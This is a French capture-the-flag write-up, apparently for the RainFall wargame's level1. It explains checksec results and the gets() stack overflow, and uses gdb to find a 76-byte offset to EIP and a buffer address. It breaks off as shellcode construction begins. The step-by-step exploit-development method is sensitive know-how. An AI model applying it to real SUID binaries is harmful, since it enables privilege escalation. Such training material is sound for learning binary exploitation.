# level1

## Phase d'observation

On a un message similaire au niveau précédent

```diff
RELRO  STACK CANARY           NX            PIE             RPATH      RUNPATH      FILE
- No RELRO  No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level1/level1
```

-   🐦 **STACK CANARY** (No canary found) : Un "canari" est une valeur de contrôle placée sur la pile pour détecter les débordements (comme les mineurs utilisaient des canaris pour détecter le gaz). Sans canari, on peut écraser la mémoire sans déclencher d'alarme du programme.

-   🧱 **NX (Disabled)** : NX signifie "Non-Executable stack". Cela veut dire que la zone mémoire de la pile n'est pas verrouillée.  on peut injecter notre propre code (un shellcode), le processeur acceptera de le lire comme des instructions.

-   🎯 **PIE (No PIE)** : Le code du programme lui-même n'est pas "Position Independent". Ses fonctions (comme le main) seront toujours chargées à des adresses mémoires fixes.

On vérifie les droits du binaire
```console
~$ ls -l
total 8
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
```

Même constat que pour le level0 il possède le bit SUID

### Premiers test du binaire
```console
~$ level1@RainFall:~$ ./level1 
adawd
~$ level1@RainFall:~$ ./level1 dawd
dw
```
 
#### Premières hypothèses
- Le programme attend une entrée spécifique
- Un rapport avec une ouverture de fichier
- construction et utilisation d'un shellcode


On va vérifier nos hyposthèses

```console
~$ gdb ./level1
(gdb) disas main

```

On peut voir que le programme utilise la fonction gets() qui est notre faille.

#### Pourquoi ?
Parce qu'elle est aveugle. Quand on utilise gets(buffer), elle lit tout ce que l'utilisateur tape au clavier jusqu'à ce qu'il appuie sur la touche "Entrée" (\n), sans jamais vérifier si la taille du texte rentre dans la variable de destination.

La fonction gets() a d'ailleurs été officiellement bannie et supprimée des standards récents du C.

## Phase d'éxploitation
### Comment exploiter la faille
#### Première étape 

Pour exploiter cette faille, nous devons d'abord prouver qu'elle est bien là et mesurer précisément la taille du buffer.

On commence par préparer une longue chaine de charactère 
``` console
~$ python3 -c print('A' * 100)
```
On lance notre programme ave GDB le but est de faire segfault le programme et d'inspecter le registre **eip**.

#### Pourquoi le registre eip ?

car c'est ici que le processeur va aller chercher la prochaine instruction à executer

```console
~$ gdb ./level1
~$ (gdb) run
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) info register eip
eip            0x41414141	0x41414141
```
 Ici on peut observer que le programme a bien segfault avec une chaîne trop longue et que le registre contient 'AAAA' en hexadecimal ce qui prouve que nous avons reussi a pousser nos lettre dans ce registre on va devoir maintenant viser précisement pour ce faire il nous faut trouver la taille exacte de notre buffer

#### Deuxième étape : Calculer la taille du buffer

Le but ici est de créer un chaine de caractère qui nous permette de déterminer la taille de notre buffer pour ce faire nous allons utiliser l'alphabet 

```console
~$ python3 -c 'print("".join([chr(i)*4 for i in range(65, 91)]))'
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
```

Chaque lettre est représentées 4 fois car nous avons vue que notre registre contenais 4 octets nous pourrons déterminer sa taille grâce la lettre contenue dans le registre

```console
$ gdb ./level1
(gdb) run
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
Program received signal SIGSEGV, Segmentation fault.
0x54545454 in ?? ()
(gdb) info register eip
eip            0x54545454	0x54545454
```
Ici la valeur 0x54 en hexadécimal correspond au code ASCII de la lettre majuscule T.

La lettre "T" est la 20ème lettre de l'alphabet. Cela signifie qu'il y a eu 19 blocs de 4 lettres (de A à S) juste avant elle.
19 blocs × 4 lettres = 76 caractères.

Voici comment va se comporter la mémoire :

1. Les 76 premiers caractères remplissent le buffer et l'espace sur la pile (le padding).

2. Les 4 caractères suivants (les T) écrasent le registre EIP.

3. Tout ce qui vient après finit stocké encore plus bas sur la pile.

#### Troisième étapes : Trouver l'addresse de depart du buffer
Maintenant que nous avons la taille de notre buffer on va devoir trouver l'addresse de son pointeur, pour cela nous allons provoquer un crash controlé qui nous permettra d'inspecter la memoire.

on va d'abord créer le contenue de notre buffer

```console
$ python -c print("A" * 76 + "B" * 4)
```

Nous allons ensuite lançer notre programme avec gdb et inspecter la memoire

```console
$ gdb ./level1
(gdb) run
# ici on envoie le resultat de la commande précédente

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```
On voit que notre programme à bien segfault sur nos 'B'.

le registre ESP (le pointeur de pile) pointe juste après nos "B". Nos "A" sont donc stockés juste "au-dessus" dans la mémoire.

Dans GDB, nous allons examiner les 40 blocs de mémoire (mots hexadécimaux) situés un peu avant ESP avec la commande suivante :

x/40xw $esp-120

- x : Examine

- 40xw : Affiche 40 mots (words) au format hexadécimal (x)

- $esp-120 : Commence à chercher 120 octets avant la position actuelle de la pile.

```console
(gdb) x/40xw $esp-120
0xbffff6c8:	0xbffff764	0xb7fd0ff4	0x00000000	0x00000000
0xbffff6d8:	0xbffff738	0x08048495	0xbffff6f0	0x0000002f
0xbffff6e8:	0xbffff73c	0xb7fd0ff4	0x41414141	0x41414141
0xbffff6f8:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff708:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff718:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff728:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff738:	0x41414141	0x42424242	0x00000000	0xbffff7d4
0xbffff748:	0xbffff7dc	0xb7fdc858	0x00000000	0xbffff71c
0xbffff758:	0xbffff7dc	0x00000000	0x08048230	0xb7fd0ff4
```

L'addresse qui nous interresse est la suivante : **0xbffff6e8**

```
0xbffff6e8:	0xbffff73c	0xb7fd0ff4	0x41414141	0x41414141
```
Chaque "colonne" représente 4 octets.

- La 1ère colonne commence à l'adresse 0xbffff6e8

- La 2ème commence à 0xbffff6ec (e8 + 4)

- La 3ème commence à 0xbffff6f0 et c'est là que commencent nos 0x41414141

voici l'adresse de départ du buffer **0xbffff6f0**


#### Qatrième étape: Création de notre shellcode

##### Un shellcode c'est quoi ?
un shellcode est une chaîne de caractères qui va être injectée en mémoire car elle sera en dehors de l'espace normalement alloué. Or les chaînes de caractères, dans la plupart des langages de programmation, ont l'octet nul (0x00) comme marqueur de fin.

##### Comment crée notre shellcode ?

Pour créer notre shellcode nous allons faire tout d'abord notre programme en ASM qui lançe **execve(bin/sh)**

